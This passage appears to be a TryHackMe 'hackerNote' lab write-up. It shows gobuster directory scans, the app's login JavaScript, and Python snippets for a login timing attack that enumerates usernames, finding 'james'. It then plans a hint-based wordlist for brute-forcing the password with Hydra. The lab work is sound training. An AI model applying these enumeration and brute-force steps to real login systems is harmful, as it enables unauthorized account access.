+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/hackerNote$ gobuster dir -u 10.10.24.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:            http://10.10.24.100
+</span></span><span class=line><span class=cl>[+] Threads:        10
+</span></span><span class=line><span class=cl>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span class=line><span class=cl>[+] User Agent:     gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Timeout:        10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/11/14 21:41:52 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/login (Status: 301)
+</span></span><span class=line><span class=cl>/notes (Status: 301)
+</span></span><span class=line><span class=cl>/http%3A%2F%2Fwww (Status: 301)
+</span></span><span class=line><span class=cl>Progress: 29969 / 220561 (13.59%)^C
+</span></span><span class=line><span class=cl>[!] Keyboard interrupt detected, terminating.
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/11/14 21:43:41 Finished
+</span></span><span class=line><span class=cl>===============================================================
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/hackerNote$ gobuster dir -u http://10.10.24.100:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:            http://10.10.24.100:8080
+</span></span><span class=line><span class=cl>[+] Threads:        10
+</span></span><span class=line><span class=cl>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span class=line><span class=cl>[+] User Agent:     gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Timeout:        10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/11/14 21:43:36 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/login (Status: 301)
+</span></span><span class=line><span class=cl>/notes (Status: 301)
+</span></span><span class=line><span class=cl>Progress: 16928 / 220561 (7.67%)^C
+</span></span><span class=line><span class=cl>[!] Keyboard interrupt detected, terminating.
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/11/14 21:44:39 Finished
+</span></span><span class=line><span class=cl>===============================================================
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.24.100/login/>http://10.10.24.100/login/</a></p><p><a href=http://10.10.24.100/notes/>http://10.10.24.100/notes/</a></p><p><a href=http://10.10.24.100:8080/login/>http://10.10.24.100:8080/login/</a></p><p><a href=http://10.10.24.100:8080/notes/>http://10.10.24.100:8080/notes/</a></p><p><a href=view-source:http://10.10.24.100/login/login.js>view-source:http://10.10.24.100/login/login.js</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>login</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#username&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#password&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>button</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#loginButton&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>button</span><span class=p>.</span><span class=nx>disabled</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#status&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s2>&#34;Logging you in...&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>response</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>postData</span><span class=p>(</span><span class=s2>&#34;/api/user/login&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>username</span><span class=o>:</span> <span class=nx>username</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>password</span><span class=o>:</span> <span class=nx>password</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=p>});</span>
+</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>response</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>response</span><span class=p>.</span><span class=nx>status</span> <span class=o>!==</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>response</span><span class=p>.</span><span class=nx>status</span> <span class=o>!==</span> <span class=s2>&#34;success&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#status&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#errorMessage&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=nx>response</span><span class=p>.</span><span class=nx>status</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>button</span><span class=p>.</span><span class=nx>disabled</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>response</span><span class=p>.</span><span class=nx>SessionToken</span> <span class=o>!==</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s2>&#34;/notes&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>forgotPassword</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=c1>//Based on username, find return password hint
+</span></span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>username</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#username&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>response</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>getData</span><span class=p>(</span><span class=s2>&#34;/api/user/passwordhint/&#34;</span> <span class=o>+</span> <span class=nx>username</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>response</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>response</span><span class=p>.</span><span class=nx>hint</span> <span class=o>!==</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>response</span><span class=p>.</span><span class=nx>hint</span> <span class=o>!==</span> <span class=s2>&#34;success&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#passwordHint&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;Hint: &#34;</span> <span class=o>+</span> <span class=nx>response</span><span class=p>.</span><span class=nx>hint</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>getCookie</span><span class=p>(</span><span class=nx>name</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>v</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>.</span><span class=nx>match</span><span class=p>(</span><span class=s2>&#34;(^|;) ?&#34;</span> <span class=o>+</span> <span class=nx>name</span> <span class=o>+</span> <span class=s2>&#34;=([^;]*)(;|$)&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>v</span> <span class=o>?</span> <span class=nx>v</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>:</span> <span class=kc>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>onLoad</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>session</span> <span class=o>=</span> <span class=nx>getCookie</span><span class=p>(</span><span class=s2>&#34;SessionToken&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>session</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>session</span> <span class=o>!==</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=nx>session</span> <span class=o>!==</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s2>&#34;/notes&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>createUser</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>button</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#userCreateButton&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#usernameCreate&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#passwordCreate&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>passwordHint</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#passwordHintCreate&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>Username</span><span class=o>:</span> <span class=nx>username</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>Password</span><span class=o>:</span> <span class=nx>password</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>PasswordHint</span><span class=o>:</span> <span class=nx>passwordHint</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#statusCreation&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Creating your account&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>button</span><span class=p>.</span><span class=nx>disabled</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>response</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>postData</span><span class=p>(</span><span class=s2>&#34;/api/user/create&#34;</span><span class=p>,</span> <span class=nx>user</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>response</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>response</span><span class=p>.</span><span class=nx>status</span> <span class=o>!==</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>response</span><span class=p>.</span><span class=nx>status</span> <span class=o>!==</span> <span class=s2>&#34;success&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#statusCreation&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#errorMessage&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=nx>response</span><span class=p>.</span><span class=nx>status</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#statusCreation&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#statusCreation&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;Successfully created a user account&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#usernameCreate&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#passwordCreate&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#passwordHintCreate&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#statusCreation&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;#errorMessage&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Something went wrong...&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>login</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>response</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>postData</span><span class=p>(</span><span class=s2>&#34;/api/user/login&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>username</span><span class=o>:</span> <span class=nx>username</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nx>password</span><span class=o>:</span> <span class=nx>password</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>forgotPassword</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>response</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>getData</span><span class=p>(</span><span class=s2>&#34;/api/user/passwordhint/&#34;</span> <span class=o>+</span> <span class=nx>username</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>createUser</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>response</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>postData</span><span class=p>(</span><span class=s2>&#34;/api/user/create&#34;</span><span class=p>,</span> <span class=nx>user</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>Create your own user account</p><p><code>No answer needed</code></p><p>Log in to your account</p><p><code>No answer needed</code></p><p>Try and log in to an invalid user account</p><p><code>No answer needed</code></p><p>Try and log in to your account, with an incorrect password.</p><p><code>No answer needed</code></p><p>Notice the timing difference. This allows user enumeration</p><p><code>No answer needed</code></p><h2 id=task-3-exploit>Task 3 Exploit<a hidden class=anchor aria-hidden=true href=#task-3-exploit>#</a></h2><p><strong>Use the timing attack</strong></p><p>Now that we know there&rsquo;s a timing attack, we can write a python script to exploit it.</p><p>The first step is working out how login requests work. You can use Burpsuite for this, but I prefer to use Firefox dev tools as I don&rsquo;t have to configure any proxies.</p><p>Here we can see the login is a POST request to /api/user/login. This means we can make this request using CURL, python or another programming language of your choice.</p><p><img loading=lazy src=https://i.imgur.com/swXlKKU.png alt></p><p>In python, we can use this code and the Requests library to send this request as follows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>creds</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=n>username</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;invalidPassword!&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span><span class=n>json</span><span class=o>=</span><span class=n>creds</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>The next stage is timing this. Using the &ldquo;time&rdquo; standard library, we can work out the time difference between when we send the request and when we get a response. I&rsquo;ve moved the login request into it&rsquo;s own function called doLogin.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>startTime</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>doLogin</span><span class=p>(</span><span class=n>user</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>endTime</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>The next step is now to repeat this for all usernames in the username list. This can be done with a series of for loops. The first will read usernames from a file into a list, and the second will test each of these usernames and see the time taken to respond. For my exploit, I decided that times within 10% of the largest time were likely to be valid usernames.</p><p><strong>Why does the time taken change?</strong></p><p>The backend is intentionally poorly written. The server will only try to verify the password of the user if it receives a correct username. The psuedocode to explain this better is below.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>username</span> <span class=ow>in</span> <span class=n>users</span><span class=p>:</span> <span class=c1>##If it&#39;s a valid username</span>
+</span></span><span class=line><span class=cl>        <span class=n>login_status</span> <span class=o>=</span> <span class=n>check_password</span><span class=p>(</span><span class=n>password</span><span class=p>)</span> <span class=c1>##This takes a noticeable amount of time</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>login_status</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>new_session_token</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;Username or password incorrect&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Username or password incorrect&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Pre-written exploits in Golang and Python are available here: <a href=https://github.com/NinjaJc01/hackerNoteExploits>https://github.com/NinjaJc01/hackerNoteExploits</a></p><p>Use the Honeypot capture or Names/names.txt from <a href=https://github.com/danielmiessler/SecLists/tree/master/Usernames>https://github.com/danielmiessler/SecLists/tree/master/Usernames</a>. The shorter the list is, the faster the exploit will complete. (Hint: one of those wordlists is shorter.)</p><p>NOTE: The Golang exploit is not reliable but it is faster. If you get invalid usernames, try re-running it after a minute or switching to the python exploit.</p><p>Try to write a script to perform a timing attack.</p><p>How many usernames from the list are valid?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/hackerNote$ python3 exploitAPI.py
+</span></span><span class=line><span class=cl>Starting POST Requests
+</span></span><span class=line><span class=cl>Finished POST requests
+</span></span><span class=line><span class=cl>Time delta: 2.046557664871216 seconds (larger is better)
+</span></span><span class=line><span class=cl>james is likely to be valid
+</span></span></code></pre></td></tr></table></div></div><p><code>1</code></p><p>What are/is the valid username(s)?</p><p><code>james</code></p><h2 id=task-4-attack-passwords>Task 4 Attack Passwords<a hidden class=anchor aria-hidden=true href=#task-4-attack-passwords>#</a></h2><p><strong>Next Step</strong></p><p>Now that we have a username, we need a password. Because the passwords are hashed with bcrypt and take a noticeable time to verify, bruteforcing with a large wordlist like rockyou is not feasible.
+Fortunately, this webapp has password hints!</p><p>With the username that we found in the last step, we can retrieve the password hint. From this password hint, we can create a wordlist and (more) efficiently bruteforce the user&rsquo;s password.</p><p><strong>Create your wordlist</strong></p><p>The password hint is &ldquo;my favourite colour and my favourite number&rdquo;, so we can get a wordlist of colours and a wordlist of digits and combine them using Hashcat Util&rsquo;s Combinator which will give us every combination of the two wordlists. Using this wordlist, we can then use Hydra to attack the login API route and find the password for the user. Download the attached wordlist files, look at them then combine them using hashcat-util&rsquo;s combinator.
